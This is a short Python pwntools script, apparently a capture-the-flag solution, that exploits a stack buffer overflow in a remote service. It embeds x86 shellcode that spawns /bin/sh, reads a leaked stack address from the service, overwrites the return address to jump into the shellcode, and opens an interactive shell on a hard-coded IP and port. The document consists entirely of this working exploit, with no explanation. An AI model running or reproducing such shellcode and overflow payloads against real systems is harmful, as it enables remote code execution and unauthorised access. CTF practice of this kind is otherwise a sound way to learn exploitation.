from pwn import *




shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
#p=process("./tas")
p=remote("3.92.136.78",5001)

data=p.recvuntil("notes:")
adr=data[29:37]
print "0x"+adr
payload=""
payload+=shellcode
payload+="AAAA"
payload+=p32(int(adr,16)-50)
pause()
p.sendline(payload)
p.interactive()

#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB